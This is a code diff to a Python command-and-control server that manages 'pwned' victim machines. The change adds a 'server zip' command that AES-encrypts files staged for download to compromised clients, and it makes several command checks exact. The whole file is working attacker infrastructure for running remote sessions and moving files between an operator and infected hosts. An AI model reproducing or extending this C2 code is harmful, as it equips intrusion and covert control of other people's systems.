@@ -8,7 +8,7 @@ from colorama import Fore
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from os import path, mkdir
-from pyzipper import AESZipFile
+from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
@@ -131,7 +131,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
                 if command.startswith("server "):
                     # The 'server show clients' commands will display pwned systems and our active session information
-                    if command.startswith("server show clients"):
+                    if command == "server show clients":
                         # Print pwned systems and active session information to our screen
                         print(f"{Fore.LIGHTCYAN_EX}Available Pwned Machines:{Fore.RESET}")
                         printLast = None
@@ -159,6 +159,31 @@ class C2Handler(BaseHTTPRequestHandler):
                                   f"{Fore.GREEN}[+] => {Fore.RESET}Use {Fore.LIGHTYELLOW_EX}server show clients "
                                   f"{Fore.RESET}command to see Available PwnedID's\n")
 
+                    elif command.startswith("server zip "):
+                        # Initialize filename to avoid PyCharm Warning
+                        filename = None
+
+                        # Zip Encrypted file that is setting in our outgoing folder
+                        try:
+                            # Check if a supplied file exists in outgoing dir
+                            filename = command.split()[2]
+
+                            if not path.isfile(f"{OUTGOING}/{filename}"):
+                                raise OSError
+
+                            with AESZipFile(f"{OUTGOING}/{filename}.zip", "w",
+                                            compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
+                                zipFile.setpassword(ZIP_PASSWORD)
+                                zipFile.write(f"{OUTGOING}/{filename}", arcname=filename)
+                                print(f"{Fore.LIGHTGREEN_EX}[+]-Server => {OUTGOING}/{filename} is now Zip-Encrypted "
+                                      f"=> {Fore.RESET}{OUTGOING}/{filename}.zip \n")
+
+                        except OSError:
+                            print(f"{Fore.LIGHTRED_EX}\n[-] => Don't Access to {OUTGOING}/{filename}. {Fore.RESET}\n")
+                        except IndexError:
+                            print(f"{Fore.LIGHTRED_EX}\n[-] => You must enter a filename located in {OUTGOING} to "
+                                  f"Zip-Encrypt it. {Fore.RESET}\n")
+
                     # server unzip command allows us to unzip decrypted zip files in incoming folder on C2 Server
                     elif command.startswith("server unzip"):
                         # Initialize filename to avoid PyCharm Warning
@@ -178,7 +203,7 @@ class C2Handler(BaseHTTPRequestHandler):
                         except IndexError:
                             print(f"[-]-Server => You must enter a filename located in {INCOMING} to Unzip-Decrypt it. \n")
 
-                    elif command.startswith("server exit"):
+                    elif command == "server exit":
                         # Shutting Down the C2 Server
                         print(Fore.LIGHTRED_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n"
                                                  f"{Fore.BLUE} Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
@@ -210,7 +235,7 @@ class C2Handler(BaseHTTPRequestHandler):
                     # else block for fixing client kill command for the down client
                     else:
                         # If we have just killed a client, try to get a new session to set it active
-                        if command.startswith("client kill"):
+                        if command == "client kill":
                             get_new_client()
 
             # if client in the pwnedDict but is Not Active Session
@@ -238,7 +263,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
                 print(f"[+] Server: {filename} has been Downloaded on C2 client from C2 Server.")
 
-            except (FileNotFoundError, OSError):
+            except OSError:
                 print(f"{filepath} was not found on C2 Server.")
                 self.http_response(404)
 
